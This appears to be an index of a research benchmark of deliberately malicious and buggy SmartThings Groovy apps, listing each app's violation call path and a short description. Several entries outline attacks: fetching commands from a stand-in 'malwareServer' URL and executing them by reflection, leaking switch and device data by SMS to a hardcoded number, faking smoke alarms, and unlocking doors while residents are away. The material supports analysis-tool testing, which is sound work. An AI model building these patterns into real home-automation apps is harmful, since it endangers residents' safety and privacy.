## ID10DynamicPage+.groovy
There is no specific malicious code but there are many possible preferences that users can set. Hence, this can easily cause configuration errors to occur 
1) users find it complex to configure the apps, 
2) Context verification is hard through optional blocks such as description, "title". 
3) This allows an adversary to distribute malicious apps easily.

## ID11.1DataLeak+.groovy
Violation path: DataLeak+[motionStoppedHandler] >> DataLeak+[checkMotion] >> DataLeak+[attack] >> DataLeak+[runIn(60*0.1,changeIntensity,[overwrite: false])] >> DataLeak+[changeIntensity] >> DataLeak+[myswitch.setLevel(value+20)] >> DataLeak+[myswitch.setLevel(value+20)]
DataLeak+[changeIntensity] >> DataLeak+[myswitch.setLevel(value+20)] >> DataLeak+[changeIntensity] >> DataLeak+[myswitch.setLevel(value+20)] >> DataLeak+[myswitch.setLevel(value-20)] >> DataLeak+[changeIntensity]

Sensitive data leak example through light. Continuously increase and then decrease the intensity of light 

## ID11SensitiveDataLeak+.groovy
SensitiveDataLeak+[switchOffHandler] >> SensitiveDataLeak+[takeActions] >> SensitiveDataLeak+[send(message)] >> SensitiveDataLeak+[sendSms(phoneNumber, "${onSwitches.size()}"), SensitiveDataLeak+[sendSms(phoneNumber, state.msg),  SensitiveDataLeak+[sendSms(phoneNumber, messages)] 

State.msg and onSwitches are defined in correctTime() and they contain sensitive data on whether the switches are turned on and how many of them are turned on. Messages is defined in eventhandler() and contains the deviceId. All these sensitive data are sent to a hardcoded phone number.

## ID12RemoteCommand+.groovy
RemoteCommand+[initialize] >> RemoteCommand+[runEvery1Hour] >> RemoteCommand+[attack] >> RemoteCommand+[httpGet("http://malwareServer/getCommand")] >> RemoteCommand+["$state.command"()] 

Get command from a server using httpGet("http://malwareServer/getCommand")and execute it. (can be with or without a device)

## ID13RunTimeLogicRequired+.groovy
RunTimeLogicRequired+[presenceChanged] >> RunTimeLogicRequired+[performAction(s)] >> RunTimeLogicRequired+[$f()] 

There are ways to trick static analysis, one method is reflection through strings. This shows how static analysis system may fail (over-approximate)
performAction(s) is called, which accepts a string referring to the name of another function that will be executed.

## ID1BrightenMyPath+.groovy
BrightenMyPath+[motionActiveHandler] >> BrightenMyPath+[switch1.on()] >> BrightenMyPath+[switch1.off()] 

The app is supposed to turn on the lights when motion is detected, but an extra malicious line is added to turn off the lights.

## ID2SecuritySystem+.groovy
SecuritySystem+[presenceHandler] >> if (evt.value == "not present") SecuritySystem+[runIn( delay, turnOff )]  >> SecuritySystem+[switches.off()] 

Attacker tricks use of security system switch and turns off when user is not present

## ID3SmokeAlarm+.groovy
SmokeAlarm+[smokeHandler] >> SmokeAlarm+[runIn(getFakeValue, 60)] >> SmokeAlarm+[httpGet("http://maliciousURL/fakeStatus.php")] >> SmokeAlarm+[createFakeAlarm()] >> SmokeAlarm+[alarm.strobe()] >> SmokeAlarm+[sendNotification] >> >> SmokeAlarm+[sendSms] 
 
The smoke detector generates fake alarms which allows an attacker to break in the house.
It can also receive different malicious commands from a server to execute, instead of just alarm.strobe().

## ID3TurnItOnOffandOnEvery30Secs+.groovy
TurnItOnOffandOnEvery30Secs+[contactOpenHandler] >> TurnItOnOffandOnEvery30Secs+[switch1.on()] >> TurnItOnOffandOnEvery30Secs+[runIn(fiveMinDelay, turnOffSwitch)] >> TurnItOnOffandOnEvery30Secs+[turnOffSwitch] >> TurnItOnOffandOnEvery30Secs+[runIn(thirtySecDelay, turnOffSwitch)] >> TurnItOnOffandOnEvery30Secs+[switch1.off()] >> 

When a SmartSense Multi (contact sensor) is opened, a switch will be turned on, and then a turn off signal is sent every 30 seconds.

## ID4PowerAllowance+.groovy
PowerAllowance+[switchOnHandler] >> PowerAllowance+[runIn(delay, turnOffSwitch)] >> PowerAllowance+[turnOffSwitch] >> PowerAllowance+[theSwitch.off()] >> PowerAllowance+[turnOnSwitch()] >> PowerAllowance+[theSwitch.on()] >> 

Save energy or restrict total time an appliance (like a curling iron or TV) can be in use.  When a switch turns on, automatically turn it back off after a set number of minutes you specify. However, malicious code is added that will turn the switch back on. 

## ID5.1FakeAlarm+.groovy
FakeAlarm+[runIn(10, attack)] >> FakeAlarm+[attack] >> FakeAlarm+[createFakeEvent] >> FakeAlarm+[smokeHandler([name:"smoke" ,value:"detected"])] 

Similar to ID3SmokeAlarm+.groovy. However, this is more direct as it immediately calls the attack() function from initialize().

## ID5DynamicMethodInvocationAlarm+.groovy
DynamicMethodInvocationAlarm+[strobeHandler] >> DynamicMethodInvocationAlarm+[attack] >> DynamicMethodInvocationAlarm+[httpGet("http://server/maliciousServer.php")] >> DynamicMethodInvocationAlarm+["$state.method"()] 

The smoke detector alarm may invoke a method call by reflection.
Get a malicious method name from a server using httpGet("http://server/maliciousServer.php") and execute it. An example is stopAlarm() >> alarm.off() which will turn off the alarm after it is supposed to turn on when smoke is detected.

## ID6TurnOnSwitchNotHome+.groovy
TurnOnSwitchNotHome+[presence] >> if evt.value == "not present" TurnOnSwitchNotHome+[myswitch.setLevel(0)] >> TurnOnSwitchNotHome+[thelock.lock()] >> TurnOnSwitchNotHome+[runIn(0.1 * 60, triggerSwitch, [overwrite: false])] >> TurnOnSwitchNotHome+[triggerSwitch] >> TurnOnSwitchNotHome+[changeSwitchIntensity] >> TurnOnSwitchNotHome+[myswitch.setLevel(20)] >> TurnOnSwitchNotHome+[unlockDoor] >> TurnOnSwitchNotHome+[thelock.unlock()] 

The app locks the door and turns off the switch (change intensity) when the user is not present at home. However, malicious code is injected to unlock the door and turn on the switches after some time.

## ID7ConflictTimeandPresenceSensor+.groovy
ConflictTimeandPresenceSensor+[presenceHandler] >> if (evt.value == "not present") ConflictTimeandPresenceSensor+[switches.off()] >> if (evt.value != "not present") ConflictTimeandPresenceSensor+[switches.on()] 

ConflictTimeandPresenceSensor+[schedule(startTime, "startTimerCallback")] >> ConflictTimeandPresenceSensor+[startTimerCallback] >> ConflictTimeandPresenceSensor+[switches.on()] >> 

ConflictTimeandPresenceSensor+[schedule(stopTime, "stopTimerCallback")] >> ConflictTimeandPresenceSensor+[stopTimerCallback]>> ConflictTimeandPresenceSensor+ [switches.off()] 

Turn on one or more switches at a specified time and turn them off at a later time. When the user is present, turn on the switch. When the user is not present, turns off the switch. Presence sensor and user specified times may conflict and may create an unexpected behavior.

## ID8.1LocationModeChangeFail+.groovy
LocationModeChangeFail+[presence] >> LocationModeChangeFail+[runIn(findFalseAlarmThreshold() * 60, "takeAction", [overwrite: false])] >> LocationModeChangeFail+[takeAction] 

Monitors a set of presence detectors and triggers a mode change when everyone has left.This app has a bug that does not implement a location mode change specified by the user. (setLocationMode(newMode))  Therefore, it impacts other apps that have subscribed to the location mode change.

## ID8LocationSubscribeFailure+.groovy

This app is based on the location mode, locks or unlocks the doors through mode set via presence event. However, there is a missing subscription in initialize() and installed(). The subscription should have been set using subscribe(location, modeChangeHandler). Hence, this causes the app to not function correctly by locking/unlocking the door depending on the location mode.
Simulator allows dead codes. Event not subscribed, yet handler is there.

## ID9DisableVacationMode+.groovy
DisableVacationMode+[presence] >>if (evt.value == "not present") DisableVacationMode+[takeAction] >> DisableVacationMode+[setLocationMode(newMode)] >> DisableVacationMode+[runIn(60, attack)] >> DisableVacationMode+[attack] >> DisableVacationMode+[setLocationMode("Home")] 

This app set the location mode to be home when everyone is away, which can lead to unintended consequences.

